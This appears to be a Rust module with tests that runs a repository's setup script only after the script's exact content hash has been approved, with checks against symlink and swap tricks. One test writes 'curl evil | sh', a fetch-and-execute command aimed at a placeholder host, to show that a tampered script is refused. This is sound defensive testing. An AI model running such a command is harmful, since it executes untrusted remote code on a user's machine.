//! OC15 (overnight 11-17): a repo's setup hook, approved by content hash.
//!
//! **The hook** is `.hollow/setup.sh` at a build workspace's worktree root:
//! the one script a repo can have Hollow run when a workspace is made
//! (`build_workspaces::create_with`). It runs arbitrary code as the person,
//! so it applies to every repo, the person's own included: SK1's trust half
//! for scripts (`repo_trust`).
//!
//! **The approval** is the SHA-256 of the file's exact bytes (plain, so
//! `shasum -a 256 .hollow/setup.sh` shows the same value), scoped to the
//! repo's main working copy (`run_manifest::claude_memory_root`, so every
//! worktree of a repo answers alike), kept in `repo-trust.json`'s
//! `setupHooks` map (`repo_trust::approve_setup_hook_in`). Approving a new
//! version never drops an older one, so switching back to a branch with an
//! earlier approved script runs it without asking. Only
//! `build.approve_setup_hook`'s always-ask card records one, bound to the
//! hash the card showed: a file changed since the card is refused.
//!
//! **Only a regular file** of at most [`MAX_BYTES`] can be approved or run:
//! a symbolic link (the file or the `.hollow` folder), anything else that
//! isn't a regular file, or a bigger file never runs, and the create warning
//! says why.
//!
//! **Running** ([`run_with`]) re-reads the file, hashes those bytes and
//! refuses unless that exact hash is approved for that repo, then runs
//! exactly those bytes: they are written to a 0600 file in a fresh private
//! (0700) temp folder outside the worktree and run as `/bin/bash <file>`, so
//! a swap of the worktree's file between the check and the run changes
//! nothing. A file rather than `bash -s` on stdin: a command in the script
//! that reads stdin (an installer's prompt) would otherwise eat the rest of
//! the script. cwd is the worktree (`$0` is the temp copy, so a hook finds
//! the checkout with `$PWD`; a shebang line is ignored), every `GIT_*`
//! variable is removed, PATH is the one every agent CLI gets
//! (`agent::cli_path`), stdin is empty, stdout joins stderr, and the run goes
//! through `process_group::run_to_completion` (its own process group,
//! settled on the way out) with a [`TIMEOUT`].
//!
//! **In the background** ([`start`]): a create and both actions return at
//! once (an agent's action call waits at most `app_mcp`'s
//! `BROKER_CHANGE_TIMEOUT_SECS`, shorter than a hook may take), and the run
//! writes [`RESULT_FILE`] in the workspace's vault folder: "running" when it
//! starts, then the outcome and the output's end. One run per worktree at a
//! time. A failing or timed out hook never fails a create.
//!
//! **The card shows the whole script or refuses it** ([`card_script`]):
//! not UTF-8, or more than [`CARD_MAX_LINES`] card lines, can't be approved.
//! The hash covers `setup.sh` alone: whatever it calls in the worktree is
//! not covered, and the card says so.

use std::fs;
use std::io::Read;
use std::path::{Path, PathBuf};
use std::time::Duration;

/// The hook's path inside a worktree.
pub(crate) const HOOK_PATH: &str = ".hollow/setup.sh";
/// The biggest hook that can be approved or run.
pub(crate) const MAX_BYTES: u64 = 256 * 1024;
/// How long one run may take.
pub(crate) const TIMEOUT: Duration = Duration::from_secs(600);
/// Characters of output kept from a run.
const TAIL_CHARS: usize = 4_000;

/// A readable hook: its bytes as read once, and their hash.
#[derive(Debug, Clone, PartialEq, Eq)]
pub(crate) struct Hook {
    /// The file inside the worktree.
    pub path: PathBuf,
    /// The repo's main working copy (the approval's scope), as a real path.
    pub repo: String,
    pub bytes: Vec<u8>,
    /// SHA-256 of `bytes`, lowercase hex.
    pub hash: String,
}

impl Hook {
    pub(crate) fn short(&self) -> &str {
        &self.hash[..12]
    }
}

/// What a worktree holds at [`HOOK_PATH`].
#[derive(Debug, Clone, PartialEq, Eq)]
pub(crate) enum Found {
    None,
    /// There is something, but it can never be approved or run (why).
    Unusable(String),
    Hook(Hook),
}

/// The repo key for a worktree: its main working copy, as a real path.
pub(crate) fn repo_of(worktree: &Path) -> String {
    let real = fs::canonicalize(worktree).unwrap_or_else(|_| worktree.to_path_buf());
    let main = crate::run_manifest::claude_memory_root(&real);
    fs::canonicalize(&main)
        .unwrap_or(main)
        .to_string_lossy()
        .into_owned()
}

/// Reads `worktree`'s hook once, without following a link.
pub(crate) fn read(worktree: &Path) -> Found {
    let dir = worktree.join(".hollow");
    match fs::symlink_metadata(&dir) {
        Err(_) => return Found::None,
        Ok(meta) if meta.file_type().is_symlink() => {
            return Found::Unusable(
                "the .hollow folder is a symbolic link, so the script could come from outside the checkout".into(),
            )
        }
        Ok(meta) if !meta.is_dir() => return Found::None,
        Ok(_) => {}
    }
    let path = dir.join("setup.sh");
    let meta = match fs::symlink_metadata(&path) {
        Err(_) => return Found::None,
        Ok(meta) => meta,
    };
    if meta.file_type().is_symlink() {
        return Found::Unusable("it is a symbolic link, not a regular file".into());
    }
    if !meta.is_file() {
        return Found::Unusable("it is not a regular file".into());
    }
    if meta.len() > MAX_BYTES {
        return Found::Unusable(format!("it is over {} KB", MAX_BYTES / 1024));
    }
    let mut options = fs::OpenOptions::new();
    options.read(true);
    #[cfg(unix)]
    {
        use std::os::unix::fs::OpenOptionsExt;
        options.custom_flags(libc::O_NOFOLLOW | libc::O_NONBLOCK);
    }
    let file = match options.open(&path) {
        Ok(file) => file,
        Err(e) => return Found::Unusable(format!("it can't be read ({e})")),
    };
    if !file.metadata().is_ok_and(|m| m.is_file()) {
        return Found::Unusable("it is not a regular file".into());
    }
    let mut bytes = Vec::new();
    if let Err(e) = file.take(MAX_BYTES + 1).read_to_end(&mut bytes) {
        return Found::Unusable(format!("it can't be read ({e})"));
    }
    if bytes.len() as u64 > MAX_BYTES {
        return Found::Unusable(format!("it is over {} KB", MAX_BYTES / 1024));
    }
    let hash = sha256_hex(&bytes);
    Found::Hook(Hook {
        path,
        repo: repo_of(worktree),
        bytes,
        hash,
    })
}

pub(crate) fn sha256_hex(bytes: &[u8]) -> String {
    use sha2::{Digest, Sha256};
    Sha256::digest(bytes)
        .iter()
        .map(|b| format!("{b:02x}"))
        .collect()
}

/// The readable hook in `worktree`, or why there is none to approve or run.
pub(crate) fn require(worktree: &Path) -> Result<Hook, String> {
    match read(worktree) {
        Found::Hook(hook) => Ok(hook),
        Found::None => Err(format!(
            "{} has no setup hook ({HOOK_PATH}).",
            worktree.display()
        )),
        Found::Unusable(why) => Err(format!(
            "Hollow never approves or runs {}: {why}.",
            worktree.join(HOOK_PATH).display()
        )),
    }
}

/// Whether `hook`'s exact bytes are approved in the record at `store`.
pub(crate) fn approved_in(store: &Path, hook: &Hook) -> bool {
    crate::repo_trust::load(store).setup_hook_approved(&hook.repo, &hook.hash)
}

/// `build.approve_setup_hook`'s apply: re-reads the hook and records it only
/// when its hash and repo are still the ones the card showed (`shown`,
/// `shown_repo`; `None` skips the repo check) and its card can show it in
/// full.
pub(crate) fn approve_shown(
    worktree: &Path,
    shown: &str,
    shown_repo: Option<&str>,
    store: &Path,
) -> Result<Hook, String> {
    let hook = require(worktree)?;
    if hook.hash != shown {
        return Err(format!(
            "{} changed after its card was shown (now sha256 {}). Nothing was approved or run; ask again.",
            hook.path.display(),
            hook.short()
        ));
    }
    if shown_repo.is_some_and(|repo| repo != hook.repo) {
        return Err(format!(
            "{} now belongs to the repo {}, not the one its card showed. Nothing was approved or run; ask again.",
            hook.path.display(),
            hook.repo
        ));
    }
    card_script(&hook.bytes).map_err(unshowable)?;
    crate::repo_trust::approve_setup_hook_in(
        store,
        &hook.repo,
        &hook.hash,
        &chrono::Utc::now().to_rfc3339(),
    )?;
    Ok(hook)
}

/// The refusal for a script its card can't show in full.
pub(crate) fn unshowable(why: String) -> String {
    format!("Hollow approves only a setup hook its card can show in full, and {why}. Nothing was approved; keep setup.sh shorter.")
}

/// One run's result.
#[derive(Debug, Clone, serde::Serialize, PartialEq, Eq)]
#[serde(rename_all = "camelCase")]
pub(crate) struct RunResult {
    /// The hash of the bytes that ran.
    pub hash: String,
    pub ok: bool,
    pub exit_code: Option<i32>,
    pub timed_out: bool,
    /// Ended because its workspace's worktree was removed or the workspace
    /// trashed ([`stop`]).
    pub stopped: bool,
    /// The newest output (stdout and stderr together), control characters
    /// other than newlines shown as `?`.
    pub output_tail: String,
}

impl RunResult {
    /// What happened, in a few words.
    pub(crate) fn outcome(&self) -> String {
        if self.ok {
            "ok".into()
        } else if self.stopped {
            "stopped: the workspace's worktree was removed".into()
        } else if self.timed_out {
            format!("stopped after {} minutes", TIMEOUT.as_secs() / 60)
        } else {
            match self.exit_code {
                Some(code) => format!("failed (exit {code})"),
                None => "ended by a signal".into(),
            }
        }
    }
}

/// Runs `worktree`'s hook when its exact bytes are approved in the record
/// at `store`, else refuses naming the approve action. The check and the
/// run use the same bytes.
pub(crate) async fn run_with(
    worktree: &Path,
    store: &Path,
    limit: Duration,
    stop: Option<&crate::process_group::StopSignal>,
) -> Result<RunResult, String> {
    let (wt, record) = (worktree.to_path_buf(), store.to_path_buf());
    let hook = tokio::task::spawn_blocking(move || {
        let hook = require(&wt)?;
        if !approved_in(&record, &hook) {
            return Err(format!(
                "{} (sha256 {}) is not approved in this version, so Hollow did not run it. Ask the person with build.approve_setup_hook.",
                hook.path.display(),
                hook.short()
            ));
        }
        Ok(hook)
    })
    .await
    .map_err(|e| e.to_string())??;
    run_bytes(worktree, &hook, limit, stop).await
}

/// Runs exactly `hook.bytes` (already checked) in `worktree`.
async fn run_bytes(
    worktree: &Path,
    hook: &Hook,
    limit: Duration,
    stop: Option<&crate::process_group::StopSignal>,
) -> Result<RunResult, String> {
    let temp = tempfile::Builder::new()
        .prefix("hollow-setup-hook-")
        .tempdir()
        .map_err(|e| format!("temp folder: {e}"))?;
    let script = temp.path().join("setup.sh");
    {
        use std::io::Write;
        let mut options = fs::OpenOptions::new();
        options.write(true).create_new(true);
        #[cfg(unix)]
        {
            use std::os::unix::fs::OpenOptionsExt;
            options.mode(0o600);
        }
        let mut file = options
            .open(&script)
            .map_err(|e| format!("temp copy: {e}"))?;
        file.write_all(&hook.bytes)
            .map_err(|e| format!("temp copy: {e}"))?;
    }
    let mut cmd = tokio::process::Command::new("/bin/bash");
    // stdout joins stderr, whose newest 64 KB `run_to_completion` keeps.
    cmd.arg("-c")
        .arg("exec 1>&2; exec /bin/bash \"$1\"")
        .arg("hollow-setup-hook")
        .arg(&script)
        .current_dir(worktree);
    for (key, _) in std::env::vars_os() {
        if key.to_string_lossy().starts_with("GIT_") {
            cmd.env_remove(&key);
        }
    }
    // The PATH every agent CLI gets: a Finder- or Dock-launched Hollow
    // inherits the bare system PATH, where npm, pnpm, cargo and brew are
    // missing (exit 127).
    cmd.env("PATH", crate::agent::cli_path());
    let out = crate::process_group::run_to_completion(&mut cmd, None, limit, stop)
        .await
        .map_err(|e| format!("could not start the setup hook: {e}"))?;
    let exit_code = out.status.and_then(|s| s.code());
    let ok = !out.timed_out && !out.stopped && out.status.is_some_and(|s| s.success());
    let text: String = out
        .stderr
        .chars()
        .map(|c| if c.is_control() && c != '\n' { '?' } else { c })
        .collect();
    let chars: Vec<char> = text.chars().collect();
    let output_tail = chars[chars.len().saturating_sub(TAIL_CHARS)..]
        .iter()
        .collect();
    Ok(RunResult {
        hash: hook.hash.clone(),
        ok,
        exit_code,
        timed_out: out.timed_out,
        stopped: out.stopped,
        output_tail,
    })
}

/// Where a build workspace's last setup hook run is written: its
/// `outputs/` folder in the vault, never the worktree (that would dirty the
/// checkout).
pub(crate) const RESULT_FILE: &str = "outputs/SETUP_HOOK_RESULT.md";

pub(crate) fn result_path(vault: &Path, id: &str) -> Result<PathBuf, String> {
    crate::vault::safe_join(vault, &format!("workspaces/{}/{RESULT_FILE}", id.trim()))
}

/// Worktrees with a run going, each with the signal that stops it, so a
/// second start runs nothing and removing the worktree ends the run.
type Signal = std::sync::Arc<crate::process_group::StopSignal>;
static RUNNING: once_cell::sync::Lazy<
    std::sync::Mutex<std::collections::HashMap<PathBuf, Signal>>,
> = once_cell::sync::Lazy::new(Default::default);

struct Running(PathBuf);

impl Drop for Running {
    fn drop(&mut self) {
        RUNNING
            .lock()
            .unwrap_or_else(|e| e.into_inner())
            .remove(&self.0);
    }
}

fn is_running(worktree: &Path) -> bool {
    RUNNING
        .lock()
        .unwrap_or_else(|e| e.into_inner())
        .contains_key(worktree)
}

/// Asks a run going in `worktree` to stop (its process group is ended);
/// returns whether there was one. For a workspace being trashed.
pub(crate) fn request_stop(worktree: &Path) -> bool {
    let signal = RUNNING
        .lock()
        .unwrap_or_else(|e| e.into_inner())
        .get(worktree)
        .cloned();
    signal.map(|s| s.request()).is_some()
}

/// [`request_stop`], then waits (up to 30 s) until the run has ended, so
/// the worktree can be removed under nothing (`build_workspaces::remove_for_unless`).
pub(crate) async fn stop(worktree: &Path) {
    if !request_stop(worktree) {
        return;
    }
    for _ in 0..300 {
        if !is_running(worktree) {
            return;
        }
        tokio::time::sleep(Duration::from_millis(100)).await;
    }
    eprintln!(
        "[setup-hook] the run in {} did not end within 30 s of its stop",
        worktree.display()
    );
}

/// Writes build workspace `id`'s result file, resolving its path inside the
/// vault again each time (a swapped `outputs/` link can't send it out), and
/// only while `workspaces/<id>` still exists (a trashed workspace's folder
/// is never recreated).
fn write_result(vault: &Path, id: &str, text: &str) {
    let gone = crate::vault::safe_join(vault, &format!("workspaces/{}", id.trim()))
        .map(|dir| !dir.is_dir())
        .unwrap_or(true);
    if gone {
        eprintln!("[setup-hook] workspace {id} is gone; its result is not written");
        return;
    }
    let write = || -> Result<(), String> {
        let path = result_path(vault, id)?;
        if let Some(dir) = path.parent() {
            fs::create_dir_all(dir).map_err(|e| format!("mkdir: {e}"))?;
        }
        crate::vault::atomic_write(&result_path(vault, id)?, text.as_bytes())
    };
    if let Err(e) = write() {
        eprintln!("[setup-hook] could not write workspace {id}'s result: {e}");
    }
}

/// The result file's text.
fn render(worktree: &Path, started: &str, status: &str, detail: Option<&RunResult>) -> String {
    let mut out = format!(
        "# Setup hook result\n\nHollow ran this build workspace's {HOOK_PATH} (OC15) in the background.\n\n- Worktree: {}\n- Started: {started}\n- Status: {status}\n",
        worktree.display()
    );
    if let Some(result) = detail {
        out.push_str(&format!(
            "- sha256: {}\n- Finished: {}\n\n## Output's end\n\n",
            result.hash,
            chrono::Utc::now().to_rfc3339()
        ));
        let longest = result
            .output_tail
            .split(|c| c != '`')
            .map(str::len)
            .max()
            .unwrap_or(0);
        let fence = "`".repeat(longest.max(2) + 1);
        out.push_str(&format!(
            "{fence}text\n{}\n{fence}\n",
            result.output_tail.trim_end()
        ));
    }
    out
}

/// Starts the approved hook in `worktree` in the background (rechecked at
/// run time by [`run_with`]) and writes build workspace `id`'s result file
/// now (running) and when it ends, so a create or an action returns at once.
/// Refuses when a run is already going there. Blocking I/O: call it off the
/// async threads. Returns the result file's path.
pub(crate) fn start(
    worktree: PathBuf,
    vault: PathBuf,
    id: String,
    store: PathBuf,
    limit: Duration,
) -> Result<PathBuf, String> {
    let result = result_path(&vault, &id)?;
    let signal = Signal::default();
    {
        let mut running = RUNNING.lock().unwrap_or_else(|e| e.into_inner());
        if running.contains_key(&worktree) {
            return Err(format!(
                "The setup hook is already running in {}; its result goes to {}.",
                worktree.display(),
                result.display()
            ));
        }
        running.insert(worktree.clone(), signal.clone());
    }
    let running = Running(worktree.clone());
    let started = chrono::Utc::now().to_rfc3339();
    write_result(
        &vault,
        &id,
        &render(
            &worktree,
            &started,
            &format!("running ({} minutes at most)", limit.as_secs().div_ceil(60)),
            None,
        ),
    );
    tauri::async_runtime::spawn(async move {
        let _running = running;
        let text = match run_with(&worktree, &store, limit, Some(&signal)).await {
            Ok(run) => render(&worktree, &started, &run.outcome(), Some(&run)),
            Err(e) => render(&worktree, &started, &format!("not run: {e}"), None),
        };
        let _ = tokio::task::spawn_blocking(move || write_result(&vault, &id, &text)).await;
    });
    Ok(result)
}

/// [`start`] for build workspace `id` on Hollow's own record (the two
/// actions), off the async threads; returns the result file's path.
pub(crate) async fn start_for(vault: &Path, id: &str, worktree: PathBuf) -> Result<String, String> {
    let (vault, id) = (vault.to_path_buf(), id.to_string());
    tokio::task::spawn_blocking(move || {
        start(
            worktree,
            vault,
            id,
            crate::repo_trust::store_path()?,
            TIMEOUT,
        )
        .map(|path| path.display().to_string())
    })
    .await
    .map_err(|e| e.to_string())?
}

/// `create_with`'s step for build workspace `id`: starts an approved hook in
/// the background without asking and returns a note saying where its result
/// goes; returns the warning for a hook that won't run; None when there is
/// no hook.
pub(crate) async fn on_create(vault: &Path, id: &str, worktree: &Path) -> Option<String> {
    let store = match crate::repo_trust::store_path() {
        Ok(store) => store,
        Err(e) => return Some(format!("Could not check the setup hook's approval: {e}")),
    };
    on_create_with(worktree, vault, id, &store, TIMEOUT).await
}

pub(crate) async fn on_create_with(
    worktree: &Path,
    vault: &Path,
    id: &str,
    store: &Path,
    limit: Duration,
) -> Option<String> {
    let (wt, record) = (worktree.to_path_buf(), store.to_path_buf());
    let checked = tokio::task::spawn_blocking(move || {
        let found = read(&wt);
        let approved = matches!(&found, Found::Hook(hook) if approved_in(&record, hook));
        (found, approved)
    })
    .await
    .ok()?;
    match checked {
        (Found::None, _) => None,
        (Found::Unusable(why), _) => Some(format!(
            "This repo has a setup hook, {HOOK_PATH}, that Hollow never approves or runs: {why}."
        )),
        (Found::Hook(hook), false) => Some(format!(
            "This repo has a setup hook, {HOOK_PATH} (sha256 {}), that Hollow did not run: this version isn't approved. To run it, ask in a chat in this workspace; the agent asks you with build.approve_setup_hook, which shows the script.",
            hook.short()
        )),
        (Found::Hook(hook), true) => {
            let (worktree, vault, id, store) = (
                worktree.to_path_buf(),
                vault.to_path_buf(),
                id.to_string(),
                store.to_path_buf(),
            );
            let started =
                tokio::task::spawn_blocking(move || start(worktree, vault, id, store, limit))
                    .await
                    .map_err(|e| e.to_string())
                    .and_then(|r| r);
            Some(match started {
                Ok(result) => format!(
                    "The approved setup hook {HOOK_PATH} (sha256 {}) is running in the background; its result goes to {}.",
                    hook.short(),
                    result.display()
                ),
                Err(e) => e,
            })
        }
    }
}

/// Characters per card line; a longer script line wraps.
const CARD_WRAP: usize = 160;
/// The most card lines a script may take (after wrapping) and still be
/// approvable: a card shows the whole script or refuses it.
pub(crate) const CARD_MAX_LINES: usize = 400;

/// The whole script as card lines: each line starts with `| `, its wrapped
/// rest with `+ `; a tab shows as two spaces and every control, line or
/// paragraph separator, bidirectional or invisible format character as `?`.
/// Err (why) when the card can't show it exactly and in full: not UTF-8, or
/// more than [`CARD_MAX_LINES`] card lines.
pub(crate) fn card_script(bytes: &[u8]) -> Result<Vec<String>, String> {
    let text = std::str::from_utf8(bytes)
        .map_err(|_| "it isn't UTF-8 text, so a card can't show it exactly".to_string())?;
    let text = text.strip_suffix('\n').unwrap_or(text);
    let mut lines = Vec::new();
    for line in text.split('\n') {
        let shown: Vec<char> = line
            .replace('\t', "  ")
            .chars()
            .map(|c| if hidden(c) { '?' } else { c })
            .collect();
        if shown.is_empty() {
            lines.push("|".to_string());
        }
        for (n, chunk) in shown.chunks(CARD_WRAP).enumerate() {
            let mark = if n == 0 { '|' } else { '+' };
            lines.push(format!("{mark} {}", chunk.iter().collect::<String>()));
        }
        if lines.len() > CARD_MAX_LINES {
            return Err(format!(
                "it takes more than the {CARD_MAX_LINES} lines a card shows (at {CARD_WRAP} characters a line)"
            ));
        }
    }
    Ok(lines)
}

/// A character a card must not print as is: control characters, line and
/// paragraph separators, bidirectional marks and overrides, and invisible
/// format or filler characters. `stakeholder_sim` refuses a persona note
/// holding any (C7 review), since its card shows the note the same way.
pub(crate) fn hidden(c: char) -> bool {
    c.is_control()
        || matches!(
            c,
            '\u{00ad}'
                | '\u{034f}'
                | '\u{061c}'
                | '\u{115f}'
                | '\u{1160}'
                | '\u{17b4}'
                | '\u{17b5}'
                | '\u{180b}'..='\u{180f}'
                | '\u{200b}'..='\u{200f}'
                | '\u{2028}'..='\u{202e}'
                | '\u{205f}'..='\u{206f}'
                | '\u{3164}'
                | '\u{fe00}'..='\u{fe0f}'
                | '\u{feff}'
                | '\u{ffa0}'
                | '\u{fff0}'..='\u{fffb}'
                | '\u{1d173}'..='\u{1d17a}'
                | '\u{e0000}'..='\u{e0fff}'
        )
}

/// The worktree of build workspace `id` in `vault`, when it still exists.
pub(crate) fn worktree_for(vault: &Path, id: &str) -> Result<PathBuf, String> {
    let info = crate::build_workspaces::binding_for(vault, id.trim())
        .ok_or_else(|| format!("{} is not a build workspace.", id.trim()))?;
    if !info.exists {
        return Err(format!(
            "{}'s worktree was removed; there is no setup hook to run.",
            id.trim()
        ));
    }
    Ok(PathBuf::from(info.worktree))
}

#[cfg(test)]
mod tests {
    use super::*;

    /// A main working copy (a `.git` folder) with `body` as its hook.
    fn checkout(root: &Path, body: &str) -> PathBuf {
        fs::create_dir_all(root.join(".git")).unwrap();
        fs::create_dir_all(root.join(".hollow")).unwrap();
        fs::write(root.join(HOOK_PATH), body).unwrap();
        root.to_path_buf()
    }

    fn hook(worktree: &Path) -> Hook {
        match read(worktree) {
            Found::Hook(hook) => hook,
            other => panic!("{other:?}"),
        }
    }

    #[test]
    fn approved_by_content_hash_per_repo_and_older_versions_stay() {
        let temp = tempfile::tempdir().unwrap();
        let record = temp.path().join("app/repo-trust.json");
        let wt = checkout(&temp.path().join("tool"), "echo one\n");
        let first = hook(&wt);
        assert_eq!(first.hash, sha256_hex(b"echo one\n"));
        assert!(!approved_in(&record, &first), "asks the first time");
        approve_shown(&wt, &first.hash, None, &record).unwrap();
        // The same bytes are approved.
        assert!(approved_in(&record, &hook(&wt)));
        // An edited hook is not (asks again).
        fs::write(wt.join(HOOK_PATH), "echo two\n").unwrap();
        let second = hook(&wt);
        assert!(!approved_in(&record, &second));
        approve_shown(&wt, &second.hash, None, &record).unwrap();
        // The older version stays approved (a branch switch back).
        fs::write(wt.join(HOOK_PATH), "echo one\n").unwrap();
        assert!(approved_in(&record, &hook(&wt)));
        let store = crate::repo_trust::load(&record);
        assert_eq!(store.setup_hooks[&first.repo].len(), 2);
        // The same bytes in another repo are not approved.
        let other = checkout(&temp.path().join("other"), "echo one\n");
        let theirs = hook(&other);
        assert_eq!(theirs.hash, first.hash);
        assert_ne!(theirs.repo, first.repo);
        assert!(!approved_in(&record, &theirs));
        // An old record without setupHooks still loads, and SK1's fields
        // survive an approval.
        let old = temp.path().join("old.json");
        fs::write(&old, r#"{"owners":["me"],"skills":{}}"#).unwrap();
        approve_shown(&other, &theirs.hash, None, &old).unwrap();
        let store = crate::repo_trust::load(&old);
        assert_eq!(store.owners, ["me"]);
        assert!(store.setup_hook_approved(&theirs.repo, &theirs.hash));
    }

    #[test]
    fn a_link_another_kind_of_file_or_a_big_file_is_never_approvable() {
        let temp = tempfile::tempdir().unwrap();
        let wt = temp.path().join("tool");
        fs::create_dir_all(wt.join(".git")).unwrap();
        assert_eq!(read(&wt), Found::None);
        // The file is a link.
        fs::create_dir_all(wt.join(".hollow")).unwrap();
        fs::write(temp.path().join("elsewhere.sh"), "echo hi\n").unwrap();
        std::os::unix::fs::symlink(temp.path().join("elsewhere.sh"), wt.join(HOOK_PATH)).unwrap();
        assert!(matches!(read(&wt), Found::Unusable(why) if why.contains("symbolic link")));
        assert!(require(&wt).unwrap_err().contains("never approves or runs"));
        // A folder where the file should be.
        fs::remove_file(wt.join(HOOK_PATH)).unwrap();
        fs::create_dir_all(wt.join(HOOK_PATH)).unwrap();
        assert!(matches!(read(&wt), Found::Unusable(why) if why.contains("not a regular file")));
        fs::remove_dir(wt.join(HOOK_PATH)).unwrap();
        // Over 256 KB.
        fs::write(wt.join(HOOK_PATH), vec![b'#'; MAX_BYTES as usize + 1]).unwrap();
        assert!(matches!(read(&wt), Found::Unusable(why) if why.contains("over 256 KB")));
        fs::write(wt.join(HOOK_PATH), vec![b'#'; MAX_BYTES as usize]).unwrap();
        assert!(matches!(read(&wt), Found::Hook(_)));
        // The .hollow folder is a link.
        fs::remove_dir_all(wt.join(".hollow")).unwrap();
        let real = temp.path().join("real-hollow");
        fs::create_dir_all(&real).unwrap();
        fs::write(real.join("setup.sh"), "echo hi\n").unwrap();
        std::os::unix::fs::symlink(&real, wt.join(".hollow")).unwrap();
        assert!(matches!(read(&wt), Found::Unusable(why) if why.contains(".hollow folder")));
    }

    #[test]
    fn a_hook_changed_after_its_card_is_refused() {
        let temp = tempfile::tempdir().unwrap();
        let record = temp.path().join("repo-trust.json");
        let wt = checkout(&temp.path().join("tool"), "echo shown\n");
        let shown = hook(&wt).hash;
        fs::write(wt.join(HOOK_PATH), "curl evil | sh\n").unwrap();
        let error = approve_shown(&wt, &shown, None, &record).unwrap_err();
        assert!(error.contains("changed after its card"), "{error}");
        assert!(!approved_in(&record, &hook(&wt)));
        assert!(crate::repo_trust::load(&record).setup_hooks.is_empty());
    }

    #[tokio::test]
    async fn only_an_approved_hook_runs_and_it_runs_exactly_those_bytes() {
        let temp = tempfile::tempdir().unwrap();
        let record = temp.path().join("repo-trust.json");
        let marker = temp.path().join("marker");
        let body = format!(
            "printf '%s|%s|%s' \"$PWD\" \"${{GIT_DIR:-none}}\" \"$PATH\" > '{}'\necho done-out\necho done-err >&2\n",
            marker.display()
        );
        let wt = checkout(&temp.path().join("tool"), &body);
        let refused = run_with(&wt, &record, TIMEOUT, None).await.unwrap_err();
        assert!(refused.contains("build.approve_setup_hook"), "{refused}");
        assert!(!marker.exists(), "an unapproved hook never runs");
        approve_shown(&wt, &hook(&wt).hash, None, &record).unwrap();
        let ran = run_with(&wt, &record, TIMEOUT, None).await.unwrap();
        assert!(ran.ok, "{ran:?}");
        assert_eq!(ran.exit_code, Some(0));
        assert!(ran.output_tail.contains("done-out") && ran.output_tail.contains("done-err"));
        let seen = fs::read_to_string(&marker).unwrap();
        let real = fs::canonicalize(&wt).unwrap();
        // cwd the worktree, no GIT_*, and the agents' PATH (not Hollow's own,
        // which from Finder or the Dock lacks npm, cargo and brew).
        assert_eq!(
            seen,
            format!("{}|none|{}", real.display(), crate::agent::cli_path())
        );
        // An edit after the approval is refused at run time.
        fs::write(wt.join(HOOK_PATH), format!("{body}echo extra\n")).unwrap();
        fs::remove_file(&marker).unwrap();
        assert!(run_with(&wt, &record, TIMEOUT, None).await.is_err());
        assert!(!marker.exists());
        // A failing approved hook reports its exit and output.
        fs::write(wt.join(HOOK_PATH), "echo broke >&2\nexit 3\n").unwrap();
        approve_shown(&wt, &hook(&wt).hash, None, &record).unwrap();
        let failed = run_with(&wt, &record, TIMEOUT, None).await.unwrap();
        assert!(!failed.ok);
        assert_eq!(failed.exit_code, Some(3));
        assert_eq!(failed.outcome(), "failed (exit 3)");
        assert!(failed.output_tail.contains("broke"));
    }

    /// Waits (bounded) for the background run's result file to leave
    /// "running".
    async fn finished(result: &Path) -> String {
        for _ in 0..300 {
            let text = fs::read_to_string(result).unwrap_or_default();
            if !text.is_empty() && !text.contains("- Status: running") {
                return text;
            }
            // sleep-ok: polls the background run's result file, 30 s at most.
            tokio::time::sleep(Duration::from_millis(100)).await;
        }
        panic!("the background run never finished");
    }

    #[tokio::test]
    async fn on_create_starts_an_approved_hook_in_the_background_and_warns_otherwise() {
        let temp = tempfile::tempdir().unwrap();
        let record = temp.path().join("repo-trust.json");
        let vault = temp.path().join("vault");
        fs::create_dir_all(vault.join("workspaces/ws1")).unwrap();
        let result = result_path(&vault, "ws1").unwrap();
        let wt = checkout(
            &temp.path().join("tool"),
            "touch made-by-hook\necho hello\n",
        );
        let warning = on_create_with(&wt, &vault, "ws1", &record, TIMEOUT)
            .await
            .unwrap();
        assert!(warning.contains("build.approve_setup_hook"), "{warning}");
        assert!(warning.contains(hook(&wt).short()), "{warning}");
        assert!(!wt.join("made-by-hook").exists());
        assert!(!result.exists());
        approve_shown(&wt, &hook(&wt).hash, None, &record).unwrap();
        let note = on_create_with(&wt, &vault, "ws1", &record, TIMEOUT)
            .await
            .unwrap();
        assert!(note.contains("running in the background"), "{note}");
        assert!(note.contains(&result.display().to_string()), "{note}");
        let text = finished(&result).await;
        assert!(
            text.contains("- Status: ok") && text.contains("hello"),
            "{text}"
        );
        assert!(text.contains(&hook(&wt).hash), "{text}");
        assert!(wt.join("made-by-hook").exists());
        idle(&wt).await;
        // A hook past its time limit is reported in the result; a second
        // start while it runs is refused.
        // sleep-ok: a hook that outlives its 1 s limit; the run ends it at the limit.
        fs::write(wt.join(HOOK_PATH), "sleep 30\n").unwrap();
        approve_shown(&wt, &hook(&wt).hash, None, &record).unwrap();
        let limit = Duration::from_secs(1);
        on_create_with(&wt, &vault, "ws1", &record, limit)
            .await
            .unwrap();
        let again = start(
            wt.clone(),
            vault.clone(),
            "ws1".into(),
            record.clone(),
            limit,
        )
        .unwrap_err();
        assert!(again.contains("already running"), "{again}");
        let text = finished(&result).await;
        assert!(text.contains("- Status: stopped after"), "{text}");
        idle(&wt).await;
        // An unapproved hook started directly is refused at run time and
        // the result says so.
        fs::write(wt.join(HOOK_PATH), "touch other\n").unwrap();
        start(
            wt.clone(),
            vault.clone(),
            "ws1".into(),
            record.clone(),
            limit,
        )
        .unwrap();
        let text = finished(&result).await;
        assert!(
            text.contains("not run") && text.contains("build.approve_setup_hook"),
            "{text}"
        );
        assert!(!wt.join("other").exists());
    }

    /// Waits (bounded) until no run is going in `worktree`.
    async fn idle(worktree: &Path) {
        for _ in 0..300 {
            if !is_running(worktree) {
                return;
            }
            // sleep-ok: polls the background run's end, 30 s at most.
            tokio::time::sleep(Duration::from_millis(100)).await;
        }
        panic!("the run never ended");
    }

    /// Delta review: removing the worktree stops a running hook, and a
    /// trashed workspace's folder is never recreated by its result.
    #[tokio::test]
    async fn removing_the_worktree_stops_the_hook_and_a_gone_workspace_gets_no_result() {
        let temp = tempfile::tempdir().unwrap();
        let record = temp.path().join("repo-trust.json");
        let vault = temp.path().join("vault");
        fs::create_dir_all(vault.join("workspaces/ws2")).unwrap();
        let result = result_path(&vault, "ws2").unwrap();
        // sleep-ok: a hook that would run for 30 s; the test stops it.
        let wt = checkout(&temp.path().join("tool"), "sleep 30\ntouch late\n");
        approve_shown(&wt, &hook(&wt).hash, None, &record).unwrap();
        start(
            wt.clone(),
            vault.clone(),
            "ws2".into(),
            record.clone(),
            TIMEOUT,
        )
        .unwrap();
